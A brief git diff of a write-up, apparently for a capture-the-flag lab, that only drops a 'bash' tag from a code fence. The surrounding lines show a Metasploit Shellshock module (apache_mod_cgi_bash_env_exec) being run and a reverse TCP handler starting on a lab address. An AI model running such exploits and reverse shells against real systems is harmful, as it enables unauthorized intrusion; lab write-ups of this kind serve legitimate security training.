@@ -124,7 +124,7 @@ Now we got the script it's possible to exploit the vulnerability. These are the 
 ```
 
 And it's possible to get a shell by exploiting it:
-```bash
+```
 msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.4:4444
